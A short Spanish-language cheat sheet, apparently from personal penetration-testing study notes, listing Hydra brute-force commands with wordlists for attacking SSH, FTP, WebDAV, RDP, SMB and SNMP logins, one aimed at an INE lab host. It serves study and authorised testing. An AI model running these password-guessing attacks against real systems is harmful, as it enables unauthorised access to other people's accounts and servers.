Es una herramienta para hacer ataques de fuerza bruta.

# Uso

### [[22-ssh|SSH]]

```
hydra -l <usuario> -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt ssh://<ip> -t 2 -v
```

### [[21-ftp|FTP]]

```bash
hydra -l <usuario> -P <wordlist (rockyou.txt)> ftp://<ip> -t <n_hilos>
```

Para una lista de usuarios podemos utilizar `-L`.

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 5 demo.ine.local ftp
```

### [[WebDAV]]

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <ip> http-get /webdav/
```

### [[3389-RDP|RDP]]

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt rdp://<ip> -s 3333
```

## [[445-SMB|SMB]] y [[161-SNMP|SNMP]]

```bash
hydra -L users.txt -P passwords.txt <ip> smb
```